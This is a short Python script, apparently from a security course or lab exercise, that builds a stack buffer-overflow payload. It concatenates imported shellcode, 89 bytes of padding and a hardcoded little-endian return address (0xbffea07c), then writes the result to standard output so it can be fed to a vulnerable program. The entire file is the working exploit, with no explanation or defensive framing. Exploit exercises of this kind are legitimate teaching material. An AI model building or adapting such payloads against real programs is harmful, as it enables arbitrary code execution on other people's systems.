import sys
import struct
from shellcode import shellcode
from struct import pack

ss = "a"*89
sys.stdout.buffer.write(shellcode + ss.encode() + pack("<I",0xbffea07c))
